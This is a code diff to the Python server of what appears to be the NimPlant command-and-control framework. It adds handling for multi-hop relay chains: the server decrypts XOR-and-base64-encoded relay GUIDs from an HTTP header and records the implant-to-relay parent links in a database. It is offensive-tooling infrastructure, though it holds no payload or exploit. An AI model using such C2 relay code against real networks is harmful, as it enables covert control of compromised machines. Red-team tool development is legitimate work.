@@ -193,25 +193,61 @@ def nim_implants_server(xor_key):
                         db.db_initialize_nimplant(np, np_server.guid)
                         utils.nimplant_print(f"DEBUG: Implant saved to database")
                         
-                        # Check for X-Relay-GUID header to establish parent-child relationship
+                        # Check for X-Relay-GUID header to establish parent-child relationship chain
                         relay_guid_header = flask.request.headers.get("X-Relay-GUID")
                         if relay_guid_header:
                             try:
-                                utils.nimplant_print(f"DEBUG: 🔗 X-Relay-GUID header found, decrypting...")
-                                # Decrypt: Base64 decode -> XOR decrypt with INITIAL_XOR_KEY
-                                encrypted_bytes = base64.b64decode(relay_guid_header)
-                                parent_guid = xor_bytes(encrypted_bytes, xor_key).decode('utf-8')
-                                utils.nimplant_print(f"DEBUG: 🔗 Decrypted parent GUID: {parent_guid}")
+                                utils.nimplant_print(f"DEBUG: 🔗 X-Relay-GUID header found: {relay_guid_header}")
                                 
-                                # Store chain relationship: child connects through parent relay
-                                # Child's listening_port is 0 (not a relay server itself, unless also configured)
-                                listening_port = 0  # Will be updated later if child also starts relay server
-                                if db.db_store_chain_relationship(np.guid, parent_guid, relay_role, listening_port):
-                                    utils.nimplant_print(f"DEBUG: 🔗 ✅ Chain relationship stored: {np.guid} -> parent: {parent_guid}")
+                                # Split by comma to get all relay GUIDs in the chain
+                                encrypted_guids = relay_guid_header.split(',')
+                                utils.nimplant_print(f"DEBUG: 🔗 Found {len(encrypted_guids)} relay GUIDs in chain")
+                                
+                                # Decrypt all GUIDs
+                                decrypted_guids = []
+                                for i, encrypted_guid in enumerate(encrypted_guids):
+                                    encrypted_bytes = base64.b64decode(encrypted_guid.strip())
+                                    decrypted_guid = xor_bytes(encrypted_bytes, xor_key).decode('utf-8')
+                                    decrypted_guids.append(decrypted_guid)
+                                    utils.nimplant_print(f"DEBUG: 🔗 Relay {i+1}: {decrypted_guid}")
+                                
+                                # Store relationships for entire chain
+                                # Chain structure: [relay1, relay2, relay3, ...]
+                                # relay1 is immediate parent of this implant
+                                # relay2 is parent of relay1, etc.
+                                # Last relay has no parent (connects to C2)
+                                
+                                # Store relationship for this implant -> first relay
+                                first_relay_guid = decrypted_guids[0]
+                                listening_port = 0  # Will be updated if this implant also starts relay server
+                                if db.db_store_chain_relationship(np.guid, first_relay_guid, relay_role, listening_port):
+                                    utils.nimplant_print(f"DEBUG: 🔗 ✅ Stored: {np.guid} -> parent: {first_relay_guid}")
                                 else:
-                                    utils.nimplant_print(f"DEBUG: 🔗 ❌ Failed to store chain relationship")
+                                    utils.nimplant_print(f"DEBUG: 🔗 ❌ Failed to store relationship for {np.guid}")
+                                
+                                # Store relationships for relay chain
+                                for i in range(len(decrypted_guids)):
+                                    child_guid = decrypted_guids[i]
+                                    
+                                    if i < len(decrypted_guids) - 1:
+                                        # Has a parent (next in chain)
+                                        parent_guid = decrypted_guids[i + 1]
+                                        if db.db_store_chain_relationship(child_guid, parent_guid, "RELAY_SERVER", 0):
+                                            utils.nimplant_print(f"DEBUG: 🔗 ✅ Stored: {child_guid} -> parent: {parent_guid}")
+                                        else:
+                                            utils.nimplant_print(f"DEBUG: 🔗 ❌ Failed to store relationship for {child_guid}")
+                                    else:
+                                        # Last relay has no parent (connects to C2)
+                                        if db.db_store_chain_relationship(child_guid, None, "RELAY_SERVER", 0):
+                                            utils.nimplant_print(f"DEBUG: 🔗 ✅ Stored: {child_guid} -> parent: None (top relay)")
+                                        else:
+                                            utils.nimplant_print(f"DEBUG: 🔗 ❌ Failed to store relationship for {child_guid}")
+                                
+                                utils.nimplant_print(f"DEBUG: 🔗 ✅ Complete relay chain stored ({len(decrypted_guids)} relays)")
                             except Exception as e:
                                 utils.nimplant_print(f"DEBUG: 🔗 ❌ Error processing X-Relay-GUID: {str(e)}")
+                                import traceback
+                                utils.nimplant_print(f"DEBUG: 🔗 ❌ Traceback: {traceback.format_exc()}")
                         else:
                             utils.nimplant_print(f"DEBUG: 🔗 No X-Relay-GUID header - direct C2 connection")
                             # Store with null parent ONLY if this is a relay server (not standard agent)
